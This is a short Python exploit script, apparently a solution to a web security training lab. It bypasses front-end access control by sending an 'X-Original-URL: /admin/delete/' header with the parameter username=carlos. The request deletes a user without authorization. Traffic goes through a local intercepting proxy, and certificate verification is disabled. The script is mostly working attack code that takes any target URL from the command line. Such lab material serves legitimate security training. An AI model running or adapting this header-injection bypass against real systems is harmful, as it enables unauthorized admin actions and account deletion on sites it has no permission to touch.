import requests #allow us to perfrom http request
import urllib3 #we gonna use this to disable the certificate warning
import sys #allow us to obtain command line argument
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecurePlatformWarning)

proxies={'https':'http://127.0.0.1:8080', 'http':'http://127.0.0.1:8080'}

def delete_user(s,url):
    delete_carlos_user_url=url+"/?username=carlos"
    #for this request we also need to set header i.e X-ORIGINAL-URL: it's the main way of the #exploting this vulnerability
    headers={"X-Original-URL":"/admin/delete/"}
    r=s.get(delete_carlos_user_url,headers=headers,verify=False,proxies=proxies)
    
    #verify if the user was deleted
    r=s.get(url,verify=False,proxies=proxies)
    res=r.text
    if "solved the lab" in res:
        print("(+) Successfully deleted carlos user ")
    else:
        print("(-) Could not delete carlos user")    

    
    
def main():
    if len(sys.argv)!=2:
        print("(+)Usage %s <url>" % sys.argv[0])
        print("(+)Example %s <www.example.com>" % sys.argv[0])
        sys.exit(-1)
    
    else:
        s=requests.Session()
        url=sys.argv[1]
        delete_user(s,url)    





if __name__=="__main__":
    main()

